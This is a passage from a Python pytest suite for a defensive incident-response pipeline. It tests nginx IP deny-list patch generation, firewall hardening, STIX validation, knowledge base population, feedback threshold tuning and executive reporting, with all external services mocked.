        """Nginx analysis generates IP deny list patches when config exists."""
        engine = self.ContainmentEngine()
        trigger = _make_trigger()

        # Create a temp nginx config for the test
        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf", delete=False) as f:
            f.write("server { listen 80; location / { proxy_pass http://backend; } }")
            nginx_path = f.name

        try:
            with patch.dict(os.environ, {"NGINX_CONFIG_PATH": nginx_path}):
                patch_doc = engine._analyze_nginx_config(trigger)
            assert patch_doc is not None
            assert patch_doc["patch_type"] == "ip_deny_list"
            assert "deny 10.99.1.1" in patch_doc["patch_content"]
            assert "deny 10.99.1.2" in patch_doc["patch_content"]
            assert patch_doc["status"] == "PROPOSED"
        finally:
            os.unlink(nginx_path)

    def test_analyze_nginx_config_missing_file_returns_none(self):
        """Nginx analysis returns None when config file does not exist."""
        engine = self.ContainmentEngine()
        trigger = _make_trigger()
        with patch.dict(os.environ, {"NGINX_CONFIG_PATH": "/nonexistent/path.conf"}):
            result = engine._analyze_nginx_config(trigger)
        assert result is None

    def test_analyze_nginx_config_no_attacker_ips_returns_none(self):
        """Nginx analysis returns None when trigger has no attacker IPs."""
        engine = self.ContainmentEngine()
        trigger = _make_trigger(attacker_ips=[])
        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf", delete=False) as f:
            f.write("server { listen 80; }")
            nginx_path = f.name
        try:
            with patch.dict(os.environ, {"NGINX_CONFIG_PATH": nginx_path}):
                result = engine._analyze_nginx_config(trigger)
            assert result is None
        finally:
            os.unlink(nginx_path)

    def test_analyze_topology_with_kill_chain(self):
        """Topology analysis generates firewall hardening patches from kill chain targets."""
        engine = self.ContainmentEngine()
        trigger = _make_trigger()

        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({"nodes": [], "edges": []}, f)
            topo_path = f.name

        try:
            with patch.dict(os.environ, {"TOPOLOGY_PATH": topo_path}):
                patch_doc = engine._analyze_topology(trigger)
            assert patch_doc is not None
            assert patch_doc["patch_type"] == "firewall_rule_hardening"
            rules = json.loads(patch_doc["patch_content"])
            assert any(r["dst"] == "web-server-01" for r in rules)
        finally:
            os.unlink(topo_path)

    def test_analyze_topology_missing_file_returns_none(self):
        """Topology analysis returns None when topology file does not exist."""
        engine = self.ContainmentEngine()
        trigger = _make_trigger()
        with patch.dict(os.environ, {"TOPOLOGY_PATH": "/nonexistent/topology.json"}):
            result = engine._analyze_topology(trigger)
        assert result is None

    # -- process_containment (full pipeline) -----------------------------

    def test_process_containment_full_pipeline(self):
        """process_containment orchestrates playbook, firewall, IaC, and Phase 5 dispatch."""
        engine = self.ContainmentEngine()
        engine.llm = None  # use fallback playbook

        with patch.object(engine, "_dispatch_to_adapt") as mock_dispatch, \
             patch.object(engine, "analyze_and_patch_configs", return_value=[]):
            results = engine.process_containment(_make_trigger())

        assert results["incident_id"] == "inc-test-0001"
        assert results["playbook"] is not None
        assert isinstance(results["firewall_blocks"], list)
        mock_dispatch.assert_called_once()

    def test_process_containment_exception_in_playbook_continues(self):
        """If playbook generation fails, firewall blocking still proceeds."""
        engine = self.ContainmentEngine()
        with patch.object(engine, "generate_playbook", side_effect=Exception("LLM down")), \
             patch.object(engine, "_dispatch_to_adapt"), \
             patch.object(engine, "analyze_and_patch_configs", return_value=[]):
            results = engine.process_containment(_make_trigger())

        assert results["playbook"] is None
        assert len(results["firewall_blocks"]) == 2  # 2 attacker IPs

    def test_process_containment_exception_in_firewall_continues(self):
        """If firewall blocking fails, IaC analysis still proceeds."""
        engine = self.ContainmentEngine()
        engine.llm = None
        with patch.object(engine, "execute_firewall_blocks", side_effect=Exception("API error")), \
             patch.object(engine, "_dispatch_to_adapt"), \
             patch.object(engine, "analyze_and_patch_configs", return_value=[]):
            results = engine.process_containment(_make_trigger())

        assert results["playbook"] is not None
        assert results["firewall_blocks"] == []

    # -- _dispatch_to_adapt (Phase 5 handoff) ----------------------------

    def test_dispatch_to_adapt_payload_structure(self):
        """Verify the adapt_tasks payload contains all required fields for Phase 5."""
        engine = self.ContainmentEngine()
        trigger = _make_trigger()
        results = {
            "playbook": {"playbook_id": "pb-123"},
            "firewall_blocks": [{"ip": "10.0.0.1", "success": True}],
            "iac_patches": [{"patch_id": "patch-001"}],
        }

        with patch("src.contain_engine.pika") as mock_pika:
            mock_conn = MagicMock()
            mock_channel = MagicMock()
            mock_pika.BlockingConnection.return_value = mock_conn
            mock_conn.channel.return_value = mock_channel
            mock_pika.PlainCredentials.return_value = MagicMock()
            mock_pika.ConnectionParameters.return_value = MagicMock()
            mock_pika.BasicProperties.return_value = MagicMock()

            engine._dispatch_to_adapt(trigger, results)

            mock_channel.basic_publish.assert_called_once()
            published_body = mock_channel.basic_publish.call_args[1].get("body") or \
                             mock_channel.basic_publish.call_args.kwargs.get("body")
            payload = json.loads(published_body)
            assert payload["incident_id"] == "inc-test-0001"
            assert payload["trigger_source"] == "phase4_contain_complete"
            assert payload["playbook_id"] == "pb-123"
            assert len(payload["iac_patches"]) == 1

    # -- _on_message (RabbitMQ callback) ---------------------------------

    def test_on_message_acks_on_success(self):
        """RabbitMQ callback acks the message on successful processing."""
        engine = self.ContainmentEngine()
        engine.llm = None
        mock_ch = MagicMock()
        mock_method = MagicMock()
        mock_method.delivery_tag = 42

        with patch.object(engine, "process_containment", return_value={}):
            engine._on_message(mock_ch, mock_method, None,
                               json.dumps(_make_trigger()).encode())

        mock_ch.basic_ack.assert_called_once_with(delivery_tag=42)

    def test_on_message_nacks_on_exception(self):
        """RabbitMQ callback nacks the message when processing raises an exception."""
        engine = self.ContainmentEngine()
        mock_ch = MagicMock()
        mock_method = MagicMock()
        mock_method.delivery_tag = 43

        with patch.object(engine, "process_containment", side_effect=Exception("boom")):
            engine._on_message(mock_ch, mock_method, None,
                               json.dumps(_make_trigger()).encode())

        mock_ch.basic_nack.assert_called_once_with(delivery_tag=43, requeue=False)


# ===================================================================
# 5.  Adaptation Engine  (src/adapt_engine.py)
# ===================================================================

class TestAdaptEngine:
    """Tests for AdaptEngine: STIX validation, KB population, RLHF, reporting."""

    @pytest.fixture(autouse=True)
    def _patch_deps(self):
        """Patch all external dependencies for AdaptEngine."""
        self.mock_os_client = MagicMock()
        self.mock_upload = MagicMock(return_value=True)
        self.mock_audit = MagicMock()
        self.mock_validate_stix = MagicMock(return_value=(True, {"counts": {"errors": 0, "warnings": 1}}))
        self.mock_feedback_loop = MagicMock(return_value=5)
        self.mock_pdf_report = MagicMock(return_value="/tmp/test_report.pdf")

        with patch("src.adapt_engine.get_opensearch_client", return_value=self.mock_os_client), \
             patch("src.adapt_engine.upload_to_opensearch", self.mock_upload), \
             patch("src.adapt_engine.AuditLogger", return_value=self.mock_audit), \
             patch("src.adapt_engine.validate_stix_json", self.mock_validate_stix), \
             patch("src.adapt_engine.run_feedback_loop", self.mock_feedback_loop), \
             patch("src.adapt_engine.generate_pdf_report", self.mock_pdf_report), \
             patch("os.makedirs"):
            from src.adapt_engine import AdaptEngine
            self.AdaptEngine = AdaptEngine
            yield

    # -- validate_stix_quality -------------------------------------------

    def test_validate_stix_quality_valid(self):
        """STIX validation returns valid=True with error/warning counts."""
        engine = self.AdaptEngine()
        # Mock playbook retrieval
        self.mock_os_client.get.return_value = {
            "_source": {
                "playbook_id": "pb-001",
                "stix_bundle_id": "bundle--abc",
                "playbook_actions": [],
            }
        }
        trigger = _make_trigger(playbook_id="pb-001")
        result = engine.validate_stix_quality(trigger)

        assert result["valid"] is True
        assert result["errors"] == 0
        assert result["warnings"] == 1

    def test_validate_stix_quality_no_playbook(self):
        """STIX validation returns reason='no_playbook' when playbook_id is absent."""
        engine = self.AdaptEngine()
        trigger = _make_trigger(playbook_id=None)
        result = engine.validate_stix_quality(trigger)
        assert result["valid"] is None
        assert result["reason"] == "no_playbook"

    def test_validate_stix_quality_no_stix_bundle(self):
        """STIX validation returns reason='no_stix_bundle' when playbook has no bundle ID."""
        engine = self.AdaptEngine()
        self.mock_os_client.get.return_value = {
            "_source": {"playbook_id": "pb-002", "stix_bundle_id": None}
        }
        trigger = _make_trigger(playbook_id="pb-002")
        result = engine.validate_stix_quality(trigger)
        assert result["valid"] is None
        assert result["reason"] == "no_stix_bundle"

    def test_validate_stix_quality_validator_unavailable(self):
        """STIX validation returns reason='validator_unavailable' when validator not imported."""
        engine = self.AdaptEngine()
        with patch.object(type(engine), "__module__", "src.adapt_engine"):
            # Simulate the function-level check
            import src.adapt_engine as mod
            original = mod.validate_stix_json
            mod.validate_stix_json = None
            try:
                result = engine.validate_stix_quality(_make_trigger(playbook_id="pb-003"))
                assert result["valid"] is None
                assert result["reason"] == "validator_unavailable"
            finally:
                mod.validate_stix_json = original

    def test_validate_stix_quality_opensearch_exception(self):
        """STIX validation handles OpenSearch exceptions gracefully."""
        engine = self.AdaptEngine()
        self.mock_os_client.get.side_effect = Exception("index_not_found")
        trigger = _make_trigger(playbook_id="pb-004")
        result = engine.validate_stix_quality(trigger)
        assert result["valid"] is None
        assert "index_not_found" in result["reason"]

    def test_validate_stix_quality_invalid_stix(self):
        """STIX validation returns valid=False when validator finds errors."""
        engine = self.AdaptEngine()
        self.mock_validate_stix.return_value = (False, {"counts": {"errors": 3, "warnings": 0}})
        self.mock_os_client.get.return_value = {
            "_source": {"playbook_id": "pb-005", "stix_bundle_id": "bundle--bad"}
        }
        trigger = _make_trigger(playbook_id="pb-005")
        result = engine.validate_stix_quality(trigger)
        assert result["valid"] is False
        assert result["errors"] == 3

    # -- populate_knowledge_base -----------------------------------------

    def test_populate_kb_adds_entries(self):
        """Knowledge base population indexes one entry per kill chain step."""
        engine = self.AdaptEngine()
        trigger = _make_trigger()
        count = engine.populate_knowledge_base(trigger)

        assert count == 2  # 2 kill chain steps
        assert self.mock_os_client.index.call_count == 2

    def test_populate_kb_document_structure(self):
        """KB documents contain expected fields: external_id, name, description, source."""
        engine = self.AdaptEngine()
        trigger = _make_trigger()
        engine.populate_knowledge_base(trigger)

        call_kwargs = self.mock_os_client.index.call_args_list[0][1]
        doc = call_kwargs["body"]
        assert doc["external_id"] == "T1595"
        assert doc["source"] == "incident_learning"
        assert doc["type"] == "attack"
        assert "inc-test-0001" in doc["description"]
        assert call_kwargs["index"] == "cti-knowledge-base"

    def test_populate_kb_no_kill_chain(self):
        """KB population returns 0 when trigger has empty kill chain."""
        engine = self.AdaptEngine()
        trigger = _make_trigger(kill_chain=[])
        count = engine.populate_knowledge_base(trigger)
        assert count == 0
        self.mock_os_client.index.assert_not_called()

    def test_populate_kb_no_opensearch(self):
        """KB population returns 0 when OpenSearch client is unavailable."""
        engine = self.AdaptEngine()
        engine.os_client = None
        count = engine.populate_knowledge_base(_make_trigger())
        assert count == 0

    def test_populate_kb_skips_non_dict_steps(self):
        """KB population skips kill chain steps that are not dicts."""
        engine = self.AdaptEngine()
        trigger = _make_trigger(kill_chain=["not-a-dict", {"technique_id": "T1059", "tactic": "execution"}])
        count = engine.populate_knowledge_base(trigger)
        assert count == 1

    def test_populate_kb_handles_index_exception(self):
        """KB population continues when individual index operations fail."""
        engine = self.AdaptEngine()
        self.mock_os_client.index.side_effect = [Exception("mapping error"), None]
        trigger = _make_trigger()
        count = engine.populate_knowledge_base(trigger)
        assert count == 1  # second one succeeded

    # -- run_feedback_adjustment (RLHF) ----------------------------------

    def test_feedback_adjustment_runs_loop(self):
        """Feedback adjustment invokes run_feedback_loop and captures count."""
        engine = self.AdaptEngine()
        result = engine.run_feedback_adjustment(_make_trigger())
        assert result["validated_count"] == 5
        self.mock_feedback_loop.assert_called_once()

    def test_feedback_adjustment_low_hit_rate_recommends_lower_threshold(self):
        """Low prediction hit rate recommends lowering confidence threshold."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.side_effect = [
            {"aggregations": {"total": {"value": 100}}},  # predictions
            {"aggregations": {"total": {"value": 30}}},   # validated (30%)
        ]
        result = engine.run_feedback_adjustment(_make_trigger())
        recs = result.get("weight_recommendations", [])
        assert any(r["recommended"] < r["current"] for r in recs)

    def test_feedback_adjustment_high_hit_rate_recommends_higher_threshold(self):
        """High prediction hit rate recommends raising confidence threshold."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.side_effect = [
            {"aggregations": {"total": {"value": 100}}},  # predictions
            {"aggregations": {"total": {"value": 95}}},   # validated (95%)
        ]
        result = engine.run_feedback_adjustment(_make_trigger())
        recs = result.get("weight_recommendations", [])
        assert any(r["recommended"] > r["current"] for r in recs)

    def test_feedback_adjustment_no_predictions(self):
        """No weight recommendations when there are no predictions."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.side_effect = [
            {"aggregations": {"total": {"value": 0}}},
            {"aggregations": {"total": {"value": 0}}},
        ]
        result = engine.run_feedback_adjustment(_make_trigger())
        assert result.get("weight_recommendations", []) == []

    def test_feedback_adjustment_feedback_loop_exception(self):
        """Feedback adjustment handles feedback_loop exception gracefully."""
        engine = self.AdaptEngine()
        self.mock_feedback_loop.side_effect = Exception("OpenSearch down")
        result = engine.run_feedback_adjustment(_make_trigger())
        assert result["validated_count"] == 0

    def test_feedback_adjustment_no_feedback_loop(self):
        """Feedback adjustment handles missing run_feedback_loop function."""
        engine = self.AdaptEngine()
        import src.adapt_engine as mod
        original = mod.run_feedback_loop
        mod.run_feedback_loop = None
        try:
            result = engine.run_feedback_adjustment(_make_trigger())
            assert result["validated_count"] == 0
        finally:
            mod.run_feedback_loop = original

    # -- build_incident_timeline -----------------------------------------

    def test_build_timeline_queries_all_phases(self):
        """Incident timeline queries all four phase indices."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.return_value = {
            "hits": {"hits": [{"_source": {"event": "test"}}]}
        }
        trigger = _make_trigger()
        timeline = engine.build_incident_timeline(trigger)

        assert "predict" in timeline["phases"]
        assert "deceive" in timeline["phases"]
        assert "mutate" in timeline["phases"]
        assert "contain" in timeline["phases"]
        assert timeline["incident_id"] == "inc-test-0001"

    def test_build_timeline_phase_record_counts(self):
        """Timeline phase data includes correct hit counts."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.return_value = {
            "hits": {"hits": [
                {"_source": {"event": "a"}},
                {"_source": {"event": "b"}},
            ]}
        }
        timeline = engine.build_incident_timeline(_make_trigger())
        for phase_name, phase_data in timeline["phases"].items():
            assert phase_data["count"] == 2

    def test_build_timeline_no_prediction_id(self):
        """Timeline skips predict and deceive phases when prediction_id is absent."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}
        trigger = _make_trigger(prediction_id=None)
        timeline = engine.build_incident_timeline(trigger)

        assert "predict" not in timeline["phases"]
        assert "deceive" not in timeline["phases"]

    def test_build_timeline_no_mtd_action_id(self):
        """Timeline skips mutate phase when mtd_action_id is absent."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}
        trigger = _make_trigger(mtd_action_id=None)
        timeline = engine.build_incident_timeline(trigger)

        assert "mutate" not in timeline["phases"]

    def test_build_timeline_opensearch_error_handling(self):
        """_query_phase returns error dict when OpenSearch query fails."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.side_effect = Exception("index_not_found")
        trigger = _make_trigger()
        timeline = engine.build_incident_timeline(trigger)

        for phase_data in timeline["phases"].values():
            assert phase_data["count"] == 0
            assert "error" in phase_data

    def test_build_timeline_stored_in_opensearch(self):
        """Incident timeline is uploaded to OpenSearch."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}
        engine.build_incident_timeline(_make_trigger())
        self.mock_upload.assert_called()

    # -- generate_executive_report ---------------------------------------

    def test_generate_report_calls_pdf_generator(self):
        """Executive report generation invokes generate_pdf_report with correct data."""
        engine = self.AdaptEngine()
        trigger = _make_trigger()
        timeline = {"phases": {"contain": {"count": 1, "records": []}}}
        path = engine.generate_executive_report(trigger, timeline)

        assert path == "/tmp/test_report.pdf"
        self.mock_pdf_report.assert_called_once()
        call_args = self.mock_pdf_report.call_args[0]
        report_data = call_args[0]
        assert report_data["confidence"] == 82
        assert len(report_data["ttps"]) == 2

    def test_generate_report_no_pdf_generator(self):
        """Executive report returns None when PDF generator is unavailable."""
        engine = self.AdaptEngine()
        import src.adapt_engine as mod
        original = mod.generate_pdf_report
        mod.generate_pdf_report = None
        try:
            result = engine.generate_executive_report(_make_trigger(), {"phases": {}})
            assert result is None
        finally:
            mod.generate_pdf_report = original

    def test_generate_report_pdf_exception(self):
        """Executive report returns None when PDF generation raises an exception."""
        engine = self.AdaptEngine()
        self.mock_pdf_report.side_effect = Exception("wkhtmltopdf not found")
        result = engine.generate_executive_report(_make_trigger(), {"phases": {}})
        assert result is None

    # -- _build_action_summary -------------------------------------------

    def test_build_action_summary_firewall(self):
        """Action summary includes firewall containment entry."""
        engine = self.AdaptEngine()
        trigger = _make_trigger(
            firewall_blocks=[
                {"ip": "10.0.0.1", "success": True},
                {"ip": "10.0.0.2", "success": False},
            ],
            playbook_id=None,
            iac_patches=[],
        )
        timeline = {"phases": {}}
        actions = engine._build_action_summary(trigger, timeline)
        fw_action = [a for a in actions if a["name"] == "Firewall Containment"]
        assert len(fw_action) == 1
        assert "1 attacker IPs" in fw_action[0]["description"]  # only 1 succeeded

    def test_build_action_summary_playbook(self):
        """Action summary includes playbook deployment entry."""
        engine = self.AdaptEngine()
        trigger = _make_trigger(playbook_id="pb-xyz", firewall_blocks=[], iac_patches=[])
        timeline = {"phases": {}}
        actions = engine._build_action_summary(trigger, timeline)
        pb_action = [a for a in actions if a["name"] == "SOAR Playbook Deployed"]
        assert len(pb_action) == 1
        assert "pb-xyz" in pb_action[0]["description"]

    def test_build_action_summary_iac_patches(self):
        """Action summary includes infrastructure patches entry."""
        engine = self.AdaptEngine()
        trigger = _make_trigger(firewall_blocks=[], playbook_id=None,
                                iac_patches=["patch-1", "patch-2"])
        timeline = {"phases": {}}
        actions = engine._build_action_summary(trigger, timeline)
        patch_action = [a for a in actions if a["name"] == "Infrastructure Patches"]
        assert len(patch_action) == 1
        assert "2 security patches" in patch_action[0]["description"]

    def test_build_action_summary_timeline_phases(self):
        """Action summary includes incident timeline phase counts."""
        engine = self.AdaptEngine()
        trigger = _make_trigger(firewall_blocks=[], playbook_id=None, iac_patches=[])
        timeline = {
            "phases": {
                "predict": {"count": 3},
                "contain": {"count": 5},
            }
        }
        actions = engine._build_action_summary(trigger, timeline)
        tl_action = [a for a in actions if a["name"] == "Incident Timeline"]
        assert len(tl_action) == 1
        assert "PREDICT: 3" in tl_action[0]["description"]
        assert "CONTAIN: 5" in tl_action[0]["description"]

    # -- process_adaptation (full pipeline) ------------------------------

    def test_process_adaptation_full_pipeline(self):
        """process_adaptation runs all five sub-engines and returns cycle document."""
        engine = self.AdaptEngine()
        self.mock_os_client.get.return_value = {
            "_source": {"playbook_id": "pb-010", "stix_bundle_id": "bundle--xyz"}
        }
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}

        trigger = _make_trigger(playbook_id="pb-010")
        cycle = engine.process_adaptation(trigger)

        assert cycle["cycle_id"].startswith("adapt-")
        assert cycle["incident_id"] == "inc-test-0001"
        assert cycle["status"] == "COMPLETED"
        assert cycle["stix_validation"]["valid"] is True
        assert cycle["knowledge_base_entries"] == 2
        assert cycle["report_path"] == "/tmp/test_report.pdf"

    def test_process_adaptation_stored_in_opensearch(self):
        """Adaptation cycle document is indexed to OpenSearch."""
        engine = self.AdaptEngine()
        self.mock_os_client.get.return_value = {
            "_source": {"playbook_id": "pb-011", "stix_bundle_id": None}
        }
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}

        engine.process_adaptation(_make_trigger(playbook_id="pb-011"))
        # At least: cycle doc + timeline doc + 2 KB entries
        assert self.mock_upload.call_count >= 1

    def test_process_adaptation_audit_logged(self):
        """Adaptation cycle completion is logged in audit trail."""
        engine = self.AdaptEngine()
        self.mock_os_client.get.return_value = {
            "_source": {"playbook_id": "pb-012", "stix_bundle_id": None}
        }
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}

        engine.process_adaptation(_make_trigger(playbook_id="pb-012"))
        self.mock_audit.log_event.assert_called()
        call_kwargs = self.mock_audit.log_event.call_args[1]
        assert call_kwargs["action"] == "ADAPT_CYCLE_COMPLETE"

    # -- _on_message (RabbitMQ callback) ---------------------------------

    def test_on_message_acks_on_success(self):
        """RabbitMQ callback acks the message on successful processing."""
        engine = self.AdaptEngine()
        mock_ch = MagicMock()
        mock_method = MagicMock()
        mock_method.delivery_tag = 99

        with patch.object(engine, "process_adaptation", return_value={}):
            engine._on_message(mock_ch, mock_method, None,
                               json.dumps(_make_trigger()).encode())

        mock_ch.basic_ack.assert_called_once_with(delivery_tag=99)

    def test_on_message_nacks_on_exception(self):
        """RabbitMQ callback nacks the message when processing fails."""
        engine = self.AdaptEngine()
        mock_ch = MagicMock()
        mock_method = MagicMock()
        mock_method.delivery_tag = 100

        with patch.object(engine, "process_adaptation", side_effect=Exception("crash")):
            engine._on_message(mock_ch, mock_method, None,
                               json.dumps(_make_trigger()).encode())

        mock_ch.basic_nack.assert_called_once_with(delivery_tag=100, requeue=False)

    # -- _compute_prediction_accuracy ------------------------------------

    def test_compute_prediction_accuracy(self):
        """Prediction accuracy computes correct hit rate from aggregations."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.side_effect = [
            {"aggregations": {"total": {"value": 200}}},
            {"aggregations": {"total": {"value": 150}}},
        ]
        result = engine._compute_prediction_accuracy(_make_trigger())
        assert result["total_predictions"] == 200
        assert result["total_validated"] == 150
        assert result["hit_rate"] == pytest.approx(0.75, abs=0.01)

    def test_compute_prediction_accuracy_zero_predictions(self):
        """Prediction accuracy returns 0 hit rate when there are no predictions."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.side_effect = [
            {"aggregations": {"total": {"value": 0}}},
            {"aggregations": {"total": {"value": 0}}},
        ]
        result = engine._compute_prediction_accuracy(_make_trigger())
        assert result["hit_rate"] == 0

    def test_compute_prediction_accuracy_exception(self):
        """Prediction accuracy returns zeroes on OpenSearch exception."""
        engine = self.AdaptEngine()
        self.mock_os_client.search.side_effect = Exception("cluster unavailable")
        result = engine._compute_prediction_accuracy(_make_trigger())
        assert result["total_predictions"] == 0
        assert result["hit_rate"] == 0
